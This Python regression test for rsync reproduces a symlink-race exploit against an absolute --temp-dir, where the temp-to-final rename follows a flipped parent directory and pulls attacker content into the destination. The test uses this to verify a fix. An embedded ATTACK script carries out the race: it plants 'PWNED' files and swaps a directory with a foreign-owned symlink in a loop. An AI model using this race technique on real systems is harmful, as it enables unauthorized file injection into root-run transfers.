#!/usr/bin/env python3
# Absolute --temp-dir parent-component symlink-race: content injection.
#
# rsync stages each transferred file as a random-named temp in --temp-dir, then
# finish_transfer() renames temp->final.  With an ABSOLUTE --temp-dir a root
# operator's rename source is a full path; a non-root attacker who can write the
# temp-dir tree flips a temp-dir parent between a real dir and a foreign-owned
# symlink -> outside, observes the random temp name in the real dir, plants
# outside/<name> with attacker content, and -- pre-fix -- the temp->final rename
# follows the flipped parent and pulls the attacker's out-of-tree file into the
# destination (the received file is replaced by injected content).
#
# The temp CREATE is already confined (secure_mkstemp); this pins the RENAME:
# do_rename_at resolves an absolute (operator) side via the ownership walk, so a
# foreign-owned flipped parent is refused.  RED on stock 3.4.x / --insecure-links,
# GREEN here.  Root+nobody gated (the cross-uid plant needs root).

import os
import subprocess
import time

import filecmp
import sys

from rsyncfns import (
    SCRATCHDIR, race_budget, find_attacker_uid,
    rmtree, rsync_argv, test_fail, test_skipped,
)

if os.geteuid() != 0:
    test_skipped("requires root to plant a temp-dir symlink owned by a non-self uid")
ATT_UID = find_attacker_uid()
if ATT_UID is None:
    test_skipped("no untrusted-uid user available for cross-uid plant")

NFILES = 40
PINNED = 1000000000

base = SCRATCHDIR / 'tmpdir-inject'
src = base / 'src'
dest = base / 'dest'
tmproot = base / 'tmproot'
td = tmproot / 'td'            # the temp-dir parent the attacker flips
tdlink = tmproot / '.tdlink'   # symlink -> outside, swapped in for td
outside = base / 'outside'


def build():
    rmtree(base)
    for d in (src, dest, tmproot, outside):
        d.mkdir(parents=True)
    for i in range(NFILES):
        # Big payloads so the temp file lingers (an observable race window).
        (src / f'f{i}').write_text('LEGIT-' + 'x' * 200000 + '\n')
        (dest / f'f{i}').write_text('old\n')
    td.mkdir()
    os.symlink(str(outside), tdlink)
    os.lchown(tdlink, ATT_UID, ATT_UID)


def push():
    return subprocess.run(
        rsync_argv('-r', f'--temp-dir={td}', f'{src}/', f'{dest}/'),
        stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)


def injected():
    for i in range(NFILES):
        try:
            if (dest / f'f{i}').read_text().startswith('PWNED'):
                return f'f{i}'
        except OSError:
            pass
    return None


# Attacker: in one tight loop, plant outside/<name> for each temp name visible
# in the real td, then flip td <-> the foreign symlink (the symlink keeps its
# foreign owner across the renames).  Must observe + plant + flip concurrently
# with the transfer because the temp names are random per push.
ATTACK = (
    "import os, sys, time\n"
    "td, link, outside = sys.argv[1], sys.argv[2], sys.argv[3]\n"
    "s = td + '.flip'\n"
    "parent = os.getppid()\n"
    "deadline = time.monotonic() + 300\n"
    "while os.getppid() == parent and time.monotonic() < deadline:\n"
    "    try:\n"
    "        for n in os.listdir(td):\n"
    "            if n[:1] != '.':\n"
    "                open(outside + '/' + n, 'w').write('PWNED')\n"
    "    except OSError:\n"
    "        pass\n"
    "    try:\n"
    "        os.makedirs(td, exist_ok=True)\n"
    "        os.rename(td, s); os.rename(link, td); os.rename(s, link)\n"
    "        os.rename(td, s); os.rename(link, td); os.rename(s, link)\n"
    "    except OSError:\n"
    "        pass\n"
)

build()
os.utime(td, (PINNED, PINNED))
before = td.stat().st_mtime_ns
proc = push()
if proc.returncode != 0:
    test_fail("positive control: clean --temp-dir transfer failed "
              f"(rc={proc.returncode}):\n{proc.stdout or ''}")
if td.stat().st_mtime_ns == before:
    test_fail(
        "positive control: --temp-dir did not create or remove a temp file "
        f"in {td}; the test would not exercise the temp->final rename source")
for i in range(NFILES):
    target = dest / f'f{i}'
    if not target.is_file():
        test_fail(f"positive control: --temp-dir did not create {target}")
    if not filecmp.cmp(src / f'f{i}', target, shallow=False):
        test_fail(f"positive control: destination content differs for {target}")

atk = subprocess.Popen([sys.executable, '-c', ATTACK,
                        str(td), str(tdlink), str(outside)])
try:
    deadline = time.monotonic() + race_budget(15.0)
    while time.monotonic() < deadline:
        rmtree(dest)
        dest.mkdir()
        push()
        hit = injected()
        if hit:
            test_fail(
                "absolute --temp-dir rename injection: attacker out-of-tree "
                f"content was renamed into the destination ({hit}) -- the "
                "temp->final rename followed a flipped foreign-owned temp-dir "
                "parent symlink.")
finally:
    atk.terminate()
    try:
        atk.wait(timeout=5)
    except subprocess.TimeoutExpired:
        atk.kill()
        atk.wait()

# No injection within the race budget.
